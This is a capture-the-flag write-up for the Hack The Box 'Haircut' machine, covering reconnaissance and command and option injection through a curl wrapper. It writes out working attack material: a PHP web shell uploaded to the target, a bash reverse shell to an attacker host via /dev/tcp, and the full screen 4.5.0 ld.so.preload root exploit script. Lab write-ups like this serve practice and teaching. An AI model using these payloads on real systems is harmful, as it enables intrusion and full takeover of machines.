### Summary
We arrive on the box's web application to see a very bare-bones site. We enumerate to find `exposed.php` which is a `curl` wrapper. We can use it along with the `-o` option injection to upload a malicious `php` webshell to the site, giving us a foothold onto the box. From there, we enumerate SUID binaries to find an outdated `screen` binary which serves as a slightly convoluted privilege escalation route to `root`

### Tools
- `feroxbuster`

###### [[#Recon]]
- [[#Initial Scan]]
- [[#Web - TCP 80]]
	- [[#exposed.php]]
###### [[#User Shell - www-data]]
- [[#Option Injection]]
- [[#Uploading Web Shell]]
- [[#Enumerating www-data]]
###### [[#Root Shell]]
- [[#Screen 4.5.0]]
	- [[#poc]]
	- [[#Fixing gcc]]

---
# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv 10.129.47.128 -oN nmap/tcp
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

❯ sudo nmap -p 22,80 -sCV -vv 10.129.47.128 -oN nmap/tcpscripts              
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDo4pezhJs9c3u8vPWIL9eW4qxQOrHCslAdMftg/p1HDLCKc+9otg+MmQMlxF7jzEu8vJ0GPfg5ONRxlsfx1mwmAXmKLh9GK4WD2pFbg4iFiAO/BAUjs3dNdR1S9wR6F+yRc2jgIyKFJO3JohZZFnM6BrTkZO7+IkSF6b3z2qzaWorHZW04XHdbxKjVCHpU5ewWQ5B32ScKRJE8bsi04Z2lE5vk1NWK15gOqmuyEBK8fcQpD1zCI6bPc5qZlwrRv4r4krCb1h8zYtAwVnoZdtYVopfACgWHxqe+/8YqS8qo4nPfEXq8LkUc2VWmFztWMCBuwVFvW8Pf34VDD4dEiIwz
|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLrPH0YEefX9y/Kyg9prbVSPe3U7fH06/909UK8mAIm3eb6PWCCwXYC7xZcow1ILYvxF1GTaXYTHeDF6VqX0dzc=
|   256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA+vUE7P+f2aiWmwJRuLE2qsDHrzJUzJLleMvKmIHoKM
80/tcp open  http    syn-ack ttl 63 nginx 1.10.0 (Ubuntu)
|_http-title:  HTB Hairdresser 
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- A `UDP` scan returned nothing
- Given the `nginx` and `OpenSSH` versions, we're likely running Ubuntu `16.04 - 16.10`

## Web - TCP 80
---
- The site is bare bones with an image `bounce.jpg`, advertising haircuts
- We can perform directory brute-forcing with `feroxbuster`:
```sh
❯ feroxbuster -u "http://10.129.47.128" -w ~/ctf/TOOLS/wordlist/Discovery/Web-Content/directory-list-1.0.txt -x html,php

http://10.129.47.128/uploads
http://10.129.47.128/bounce.jpg
http://10.129.47.128/carrie.jpg
http://10.129.47.128/test.html
http://10.129.47.128/index.html
http://10.129.47.128/sea.jpg
http://10.129.47.128/hair.html
http://10.129.47.128/exposed.php
```
- The `uploads` subdirectory is restricted, but the `exposed.php` subdirectory looks like a prime route for command injection as it's a `curl` wrapper

### exposed.php
![[Pasted image 20251227180112.png]]
- Making a request to this page is the following:
```http
formurl=http%3A%2F%2Flocalhost%2Ftest.html&submit=Go

formurl=http://localhost/test.html&submit=Go
```

- This is likely being passed to a `curl` command in the backend
- Trying to inject `;` into the command provides an error
- Injecting `%00` does nothing noticeable
- However, injecting `%0a whoami` provides evidence of command injection, as `www-data` is displayed at the bottom of the page
```http
formurl=http%3A%2F%2Flocalhost%2Ftest.html%0awhoami&submit=Go

formurl=http://localhost/test.html
whoami&submit=Go
```
![[Pasted image 20251227180711.png]]

# User Shell - www-data
## Option Injection
---
- We could utilize the command injection we just discovered to route directly to a reverse shell, but we can also utilize the existing `curl` command to inect additional options and even upload a web shell to the machine
- We can add the `-b` option to `curl` to inject a cookie and test the result with `nc`:
```http
formurl=http%3A%2F%2F10.10.14.50+-b+cookie%3d"fuck+you"&submit=Go

formurl=http://10.10.14.50 -b cookie="fuck you"&submit=Go
```
```sh
❯ sudo nc -lvknp 80
Ncat: Connection from 10.129.47.128.
Ncat: Connection from 10.129.47.128:40064.
GET / HTTP/1.1
Host: 10.10.14.50
User-Agent: curl/7.47.0
Accept: */*
Cookie: cookie=fuck you
```
- This shows successful option injection with the `curl` command!

## Uploading Web Shell
---
- We can now try and upload a webshell to the machine by hosting it with a python webserver and performing `curl -o` to the `uploads` directory
```php
<?php system($_GET['cmd']); ?>
```
```sh
❯ python3 -m http.server 12345 
Serving HTTP on 0.0.0.0 port 12345 (http://0.0.0.0:12345/) ...
```
- If we attry the following request:
```http
formurl=http%3a%2f%2f10.10.14.50%3a12345%2fwebshell.php?cmd%3dls&submit=Go

formurl=http://10.10.14.50:12345/webshell.php?cmd=ls&submit=Go
```
- The page successfully grabs the contents, but doesn't execute the command

```http
formurl=http%3a%2f%2f10.10.14.50%3a12345%2fwebshell.php%20-o%20uploads%2fwebshell.php&submit=Go

formurl=http://10.10.14.50:12345/webshell.php -o uploads/webshell.php&submit=Go
```
- Now when we navigate to `uploads/webshell.php`, we see the page! Now we can quickly get a bash reverse shell

```http
GET /uploads/webshell.php?cmd=bash+-c+'bash+-i+%26>+/dev/tcp/10.10.14.50/12345+0>%261' HTTP/1.1

GET /uploads/webshell.php?cmd=bash -c 'bash -i &> /dev/tcp/10.10.14.50/12345 0>&1' HTTP/1.1
```
```sh
❯ nc -lvnp 12345
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.129.47.128.
Ncat: Connection from 10.129.47.128:43622.
bash: cannot set terminal process group (1229): Inappropriate ioctl for device
bash: no job control in this shell
www-data@haircut:~/html/uploads$ python3 -c 'import pty; pty.spawn("bash")'
python3 -c 'import pty; pty.spawn("bash")'
www-data@haircut:~/html/uploads$ ^Z
[1]  + 2100119 suspended  nc -lvnp 12345
❯ stty raw -echo; fg 
[1]  + 2100119 continued  nc -lvnp 12345
www-data@haircut:~/html/uploads$ export TERM=xterm
```

- Now we can grab `user.txt`:
```sh
www-data@haircut:~/html/uploads$ cat /home/maria/user.txt
8a2a3c5b7e79d5abb88d0fdd23276317
```

## Enumerating www-data
---
- `sudo -l` prompts us for the password
- Running the `find` command for all directories owned by `www-data`:
```sh
www-data@haircut:~/html/uploads$ find / -type d -user $(whoami) 2>/dev/null
/var/lib/nginx/body
/var/lib/nginx/fastcgi
/var/lib/nginx/uwsgi
/var/lib/nginx/scgi
/var/lib/nginx/proxy
/var/www/html/uploads
/run/php
```
- `/run/php` is `php-fpm` runtime artifacts that describe how `php` is being executed and how `nginx` talks to it, not interesting
- There's nothing interesting in `/etc/crontab`
- No additional ports are running on the machine
- We can check for `suid` and `sgid` binaries on the machine with `find`:
```sh
www-data@haircut:~$ find / \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null -exec ls -lah {} \;
-rwsr-xr-x 1 root root 139K Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 31K Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 40K May  4  2017 /bin/su
-rwsr-xr-x 1 root root 40K Dec 16  2016 /bin/mount
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 27K Dec 16  2016 /bin/umount
-rwxr-sr-x 1 root shadow 35K Mar 16  2016 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 35K Mar 16  2016 /sbin/pam_extrausers_chkpwd
-rwsr-xr-x 1 root root 134K Jan 20  2017 /usr/bin/sudo
-rwxr-sr-x 1 root mlocate 39K Nov 18  2014 /usr/bin/mlocate
-rwsr-xr-x 1 root root 23K Jan 18  2016 /usr/bin/pkexec
-rwxr-sr-x 1 root shadow 61K May  4  2017 /usr/bin/chage
-rwxr-sr-x 1 root utmp 425K Feb  7  2016 /usr/bin/screen.old
-rwsr-xr-x 1 root root 33K May  4  2017 /usr/bin/newuidmap
-rwxr-sr-x 1 root crontab 36K Apr  5  2016 /usr/bin/crontab
-rwxr-sr-x 1 root tty 15K Mar  1  2016 /usr/bin/bsd-write
-rwsr-xr-x 1 root root 39K May  4  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 33K May  4  2017 /usr/bin/newgidmap
-rwxr-sr-x 1 root shadow 23K May  4  2017 /usr/bin/expiry
-rwsr-xr-x 1 root root 74K May  4  2017 /usr/bin/gpasswd
-rwxr-sr-x 1 root ssh 351K Mar 16  2017 /usr/bin/ssh-agent
-rwsr-sr-x 1 daemon daemon 51K Jan 14  2016 /usr/bin/at
-rwsr-xr-x 1 root root 53K May  4  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 1.6M May 19  2017 /usr/bin/screen-4.5.0
-rwsr-xr-x 1 root root 40K May  4  2017 /usr/bin/chsh
-rwxr-sr-x 1 root tty 27K Dec 16  2016 /usr/bin/wall
-rwsr-xr-x 1 root root 49K May  4  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 39K Mar  7  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwsr-xr-- 1 root messagebus 42K Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 204K Apr 29  2017 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 419K Mar 16  2017 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 15K Jan 18  2016 /usr/lib/policykit-1/polkit-agent-helper-1
```
- The most interesting item is the `screen-4.5.0` binary, which according to [GTFObins](https://gtfobins.github.io/gtfobins/screen/) is the proper version for a file write vulnerability
- We can dig more into a usable exploit with `searchsploit`

# Root Shell
## Screen 4.5.0 
---
### poc
```sh
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```

- This POC is broken into two parts:
```sh
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
```
- First, the [`__constructor__` attribute](https://gcc.gnu.org/onlinedocs/gcc-4.7.0/gcc/Function-Attributes.html#:~:text=The%20constructor%20attribute%20causes%20the,exit%20()%20has%20been%20called) causes the code to run before the execution of `main`
- This code changes the owner of `/tmp/rootshell` to `root:root`, makes it SUID executable, removes the files `/etc/ld.so.preload` and then prints that it's done
- It's then compiled to `/tmp/libhax.so` and the source code is removed

```sh
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
```
- This binary sets `uid`, `gid`, `euid`, and `egid` all to `root` and then spawns a shell
- This file is compiled to `/tmp/rootshell` and the source code is deleted

### Fixing gcc
- When we try to run `gcc`, we get the error `gcc: error trying to exec 'cc1': execvp: No such file or directory`
- We can fix this by exporting `gcc`'s path in our `$PATH` variable:
	- `export PATH=/usr/bin:$PATH`

- Now to actually perform the exploitation, we'll move to `/etc` and run the following commands:
```sh
umask 000
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
```
- `-D -m` - Start `screen` in “detached” mode, but don’t fork a new process, exiting when the session terminates
- `-L ld.so.preload` - turn on automatic output logging for the window
- `echo -ne "\x0a/tmp/libhax.so"` - command to run in the session, printing a newline followed by the path to the malicious library
- So this will start screen output the path to the library, which will be logged to the `/etc/ld.so.preload` file, and then exit.

- `/etc/ld.so.preload` holds a list of libraries that will attempt to be loaded each time any program is run. So the next time something runs as root, the malicious library will run as root. 
- The script kicks that off by calling screen again:
```sh
screen -ls
```
- Now we can see that `/tmp/rootshell` is a SUID binary owned by `root`, and we can execute it to get a root shell!

```sh
root@haircut:/etc# cat /root/root.txt
8473f454140b06b273cebf14fe61b9d0
```






